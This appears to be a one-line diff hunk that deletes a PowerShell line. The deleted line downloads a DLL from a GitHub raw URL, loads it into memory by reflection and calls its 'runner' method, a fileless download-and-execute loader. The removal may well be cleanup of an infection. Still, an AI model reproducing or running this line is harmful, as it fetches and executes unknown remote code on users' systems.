@@ -1,1 +1,0 @@
-$browser = (New-Object System.Net.WebClient); $data = $browser.DownloadData("https://github.com/js-r-api/fa/raw/main/df2.dll"); [System.Reflection.Assembly]::Load($data).GetType("ClassLibrary8.Class1")::runner()
